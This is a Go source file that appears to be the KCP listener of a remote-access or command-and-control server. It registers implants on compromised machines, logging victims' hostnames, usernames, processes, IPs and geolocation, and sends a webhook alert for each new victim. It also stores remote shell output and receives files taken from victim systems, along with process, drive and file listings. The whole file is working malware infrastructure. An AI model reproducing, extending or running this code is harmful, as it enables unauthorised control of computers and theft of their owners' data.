package kcp

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/webhooks"
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/xtaci/kcp-go/v5"
)

var KCPClientManger = make(map[string]*kcp.UDPSession)
var Mutex sync.Mutex

type ClientTime struct {
	lastHeartbeat time.Time
	timeoutCount  int
}

var ClientTimeManager = make(map[string]*ClientTime)

func HandleKCPConnection(conn *kcp.UDPSession) {
	reader := bufio.NewReader(conn)
	for {
		// 读取消息长度
		var length uint32
		err := binary.Read(reader, binary.BigEndian, &length)
		if err != nil {
			fmt.Println("Error reading message length:", err)
			return
		}

		// 根据长度读取消息内容
		message := make([]byte, length)
		_, err = io.ReadFull(reader, message)

		msgTypeBytes := message[:4]

		msgType := binary.BigEndian.Uint32(msgTypeBytes)
		switch msgType {
		case 1: //firstBlood
			msg := message[4:]
			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				fmt.Println(err)
			}
			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				fmt.Println(err)
			}
			uid := encrypt.BytesToMD5(metainfo)

			Mutex.Lock()
			KCPClientManger[uid] = conn
			Mutex.Unlock()

			connection.MuClientListenerType.Lock()
			connection.ClientListenerType[uid] = "kcp"
			connection.MuClientListenerType.Unlock()

			var client database.Clients
			exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
			if !exsists { // FirstBlood
				processID := binary.BigEndian.Uint32(metainfo[:4])
				flag := int(metainfo[4:5][0])
				ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
				localIP := utils.Uint32ToIP(ipInt).String()
				osInfo := string(metainfo[9:])

				osArray := strings.Split(osInfo, "\t")
				hostName := osArray[0]
				UserName := osArray[1]
				processName := osArray[2]

				// 外网 ip
				// 获取远程地址
				remoteAddr := conn.RemoteAddr().String()

				externalIp, _, err := net.SplitHostPort(remoteAddr)
				if err != nil {
					// 如果没有端口号，直接返回 RemoteAddr
					externalIp = remoteAddr
				}
				if externalIp == "::1" {
					externalIp = "127.0.0.1"
				}
				address, _ := qqwry.GetLocationByIP(externalIp)

				currentTime := time.Now()
				timeFormat := "01-02 15:04"
				formattedTime := currentTime.Format(timeFormat)

				arch := "x86"

				if flag > 8 {
					UserName += "*"
					flag = flag - 8
				}
				if flag > 4 {
					arch = "x64"
				}
				c := database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: "5", Online: "1", Color: ""}
				database.Engine.Insert(&c)
				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})
				if exits, key := webhooks.CheckEnable(); exits {
					webhooks.SendWecom(c, key)
				}
			}
			database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"})
			clientTime := &ClientTime{
				lastHeartbeat: time.Now(),
				timeoutCount:  0,
			}
			Mutex.Lock()
			ClientTimeManager[uid] = clientTime
			Mutex.Unlock()
			go checkHeartbeats(uid)
		case 2: // otherMsg

			msg := message[4:]
			metaLen := binary.BigEndian.Uint32(msg[:4])
			metaMsg := msg[4 : 4+metaLen]
			realMsg := msg[4+metaLen:]

			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
			if err != nil {
				fmt.Println(err)
			}
			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				fmt.Println(err)
			}
			uid := encrypt.BytesToMD5(metainfo)

			dataBytes, _ := encrypt.DecodeBase64(realMsg)
			dataBytes, _ = encrypt.Decrypt(dataBytes)
			dataBytes, _ = encrypt.Decrypt(dataBytes)
			replyTypeBytes := dataBytes[:4]
			data := dataBytes[4:]
			replyType := binary.BigEndian.Uint32(replyTypeBytes)

			switch replyType {
			case 0: //命令行展示
				var shell database.Shell
				database.Engine.Where("uid = ?", uid).Get(&shell)
				shell.ShellContent += string(data) + "\n"
				database.Engine.Where("uid = ?", uid).Update(&shell)
			case 31: // 错误展示
				var shell database.Shell
				database.Engine.Where("uid = ?", uid).Get(&shell)
				shell.ShellContent += "!Error: " + string(data) + "\n"
				database.Engine.Where("uid = ?", uid).Update(&shell)
			case command.PS:
				command.VarPidQueue.Add(uid, string(data))
			case command.FileBrowse:
				command.VarFileBrowserQueue.Add(uid, string(data))
			case 22: //文件下载第一条信息
				fileLen := int(binary.BigEndian.Uint32(data[:4]))
				filePath := string(data[4:])
				sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
				database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
				_, err = os.Stat("./Downloads/" + uid)
				if os.IsNotExist(err) {
					// 文件夹不存在，创建文件夹
					err = os.MkdirAll("./Downloads/"+uid, os.ModePerm)
				}

				// 检查文件是否存在
				if _, err := os.Stat("./Downloads/" + uid + "/" + filepath.Base(filePath)); err == nil {
					// 删除文件
					os.Remove("./Downloads/" + uid + "/" + filepath.Base(filePath))
				}
				fp, _ := os.OpenFile("./Downloads/"+uid+"/"+filepath.Base(filePath), os.O_CREATE|os.O_TRUNC|os.O_WRONLY, os.ModePerm)
				defer fp.Close()
			case command.DOWNLOAD: //文件下载
				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
				filePath := string(data[4 : 4+filePathLen])
				fileContent := data[4+filePathLen:]
				var fileDownloads database.Downloads
				database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads)
				fileDownloads.DownloadedSize += len(fileContent)
				database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)
				fp, _ := os.OpenFile("./Downloads/"+uid+"/"+filepath.Base(filePath), os.O_APPEND|os.O_WRONLY, os.ModePerm)
				fp.Write(fileContent)
				fp.Close()

			case command.DRIVES:
				drives := utils.GetExistingDrives(data)
				command.VarDrivesQueue.Add(uid, drives)
			case command.FileContent:
				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
				filePath := string(data[4 : 4+filePathLen])
				fileContent := data[4+filePathLen:]
				command.VarFileContentQueue.Add(uid, filePath, string(fileContent))
			}
		case 3: //heartBeat
			msg := message[4:]
			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				fmt.Println(err)
			}
			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				fmt.Println(err)
			}
			uid := encrypt.BytesToMD5(metainfo)

			clientTime := &ClientTime{
				lastHeartbeat: time.Now(),
				timeoutCount:  0,
			}
			Mutex.Lock()
			ClientTimeManager[uid] = clientTime
			Mutex.Unlock()

		}

	}
}
func checkHeartbeats(uid string) {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		Mutex.Lock()
		currentTime := time.Now()

		if _, exists := ClientTimeManager[uid]; exists {
			if currentTime.Sub(ClientTimeManager[uid].lastHeartbeat) > 10*time.Second {
				ClientTimeManager[uid].timeoutCount++
				if ClientTimeManager[uid].timeoutCount >= 30 {
					KCPClientManger[uid].Close()
					database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "2"})
					delete(KCPClientManger, uid)
					delete(ClientTimeManager, uid)
				}
			}
		} else {
			break
		}

		Mutex.Unlock()
	}
}
